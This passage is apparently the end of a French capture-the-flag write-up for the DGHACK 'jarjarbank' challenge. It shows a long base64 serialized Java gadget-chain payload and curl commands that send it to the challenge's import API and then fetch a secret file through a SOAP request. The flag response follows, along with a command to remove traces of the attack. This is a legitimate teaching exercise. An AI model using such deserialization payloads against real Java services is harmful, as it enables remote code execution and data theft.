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"

curl -v -X HEAD -H "Authorization: Bearer $token" -G "https://jarjarbank.chall.malicecyber.com/api/v1/transaction/import" --data-urlencode "transaction=\$2\$$payload"

curl -v --header "content-type: text/xml" -d @requestSecretFile.xml https://jarjarbank.chall.malicecyber.com/service/
```

Et voilà le précieux.

```xml
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
    <SOAP-ENV:Header/>
        <SOAP-ENV:Body>
            <ns3:transactionResponse xmlns:ns3="http://www.jarjarbank.dghack.fr/xml/">
                <transactionData>DGHACK{C0ngr4ts!_j4v4_p0pch41n_15_r34lly_fun}</transactionData>
            </ns3:transactionResponse>
    </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```

Et on oublie pas d'effacer les traces avec un `rm /tmp/GiveMeAKissMyFriend1` à repasser dans la moulinette !

Merci pour ce challenge qui m'aura donné du fil à retordre :-).
